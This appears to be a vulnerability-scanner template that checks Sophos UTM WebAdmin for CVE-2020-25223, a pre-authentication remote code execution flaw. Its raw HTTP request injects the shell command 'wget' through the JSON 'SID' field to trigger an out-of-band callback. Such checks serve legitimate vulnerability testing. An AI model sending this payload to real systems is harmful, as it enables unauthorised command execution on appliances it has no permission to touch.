id: CVE-2020-25223

info:
  name: Sophos UTM - Preauth RCE
  author: gy741
  severity: critical
  description: A remote code execution vulnerability exists in the WebAdmin of Sophos SG UTM before v9.705 MR5, v9.607 MR7, and v9.511 MR11
  reference:
    - https://www.atredis.com/blog/2021/8/18/sophos-utm-cve-2020-25223
  tags: cve,cve2020,sophos,rce,oast
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.80
    cve-id: CVE-2020-25223

requests:
  - raw:
      - |
        POST /var HTTP/1.1
        Host: {{Hostname}}
        Accept: text/javascript, text/html, application/xml, text/xml, */*
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate
        X-Requested-With: XMLHttpRequest
        X-Prototype-Version: 1.5.1.1
        Content-Type: application/json; charset=UTF-8
        Origin: {{BaseURL}}
        Connection: close
        Referer: {{BaseURL}}
        Sec-Fetch-Dest: empty
        Sec-Fetch-Mode: cors
        Sec-Fetch-Site: same-origin

        {"objs": [{"FID": "init"}], "SID": "|wget http://{{interactsh-url}}|", "browser": "gecko_linux", "backend_version": -1, "loc": "", "_cookie": null, "wdebug": 0, "RID": "1629210675639_0.5000855117488202", "current_uuid": "", "ipv6": true}

    matchers:
      - type: word
        part: interactsh_protocol # Confirms the HTTP Interaction
        words:
          - "http"
